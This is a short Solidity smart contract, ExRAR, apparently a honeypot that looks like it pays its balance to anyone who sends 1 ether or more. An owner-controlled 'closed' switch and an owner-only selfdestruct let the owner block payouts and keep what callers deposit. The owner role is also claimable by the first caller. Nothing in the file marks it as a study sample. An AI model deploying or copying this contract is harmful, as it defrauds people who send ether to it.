1 pragma solidity ^0.4.25;
2 
3 contract ExRAR {
4     address Owner;
5     bool closed = false;
6 
7     function() public payable {}
8 
9     function assignOwner() public payable {
10         if (0==Owner) Owner=msg.sender;
11     }
12     function close(bool F) public {
13         if (msg.sender==Owner) closed=F;
14     }
15     function end() public {
16             if (msg.sender==Owner) selfdestruct(msg.sender);
17     }
18     function get() public payable {
19         if (msg.value>=1 ether && !closed) {
20             msg.sender.transfer(address(this).balance);
21         }
22     }
23 }